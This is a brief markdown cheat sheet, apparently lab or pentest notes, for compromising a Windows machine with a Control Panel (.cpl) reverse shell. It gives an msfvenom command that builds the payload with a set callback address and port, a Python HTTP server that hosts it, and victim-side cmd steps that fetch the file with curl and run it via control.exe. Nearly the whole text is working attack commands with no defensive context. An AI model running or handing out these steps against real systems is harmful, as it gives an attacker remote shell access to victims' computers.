# Attacker server
- Generating a simple x64 reverse shell in a .cpl format:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.213.136 LPORT=4444 -f cpl -o shell.cpl
```
- Run listening server:
```python
python3 -m http.server 80
```
# Victim machine
- Open cmd.exe and run the following command
```cmd
curl -O http://192.168.213.136/shell.cpl
control.exe .\shell.cpl
```
